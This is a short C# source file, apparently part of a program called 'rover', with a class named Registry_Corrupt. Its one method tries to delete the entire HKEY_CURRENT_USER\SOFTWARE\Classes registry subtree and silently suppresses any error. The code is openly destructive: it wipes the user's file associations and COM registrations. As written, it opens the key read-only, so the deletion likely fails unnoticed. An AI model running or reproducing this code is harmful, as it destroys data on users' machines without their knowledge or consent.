using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace rover
{
    public class Registry_Corrupt
    {
        public void reg_main()
        {
            RegistryKey del_reg = Registry.CurrentUser.OpenSubKey(@"SOFTWARE");
            try
            {
                del_reg.DeleteSubKeyTree("Classes");
            }
            catch { }
        }
    }
}
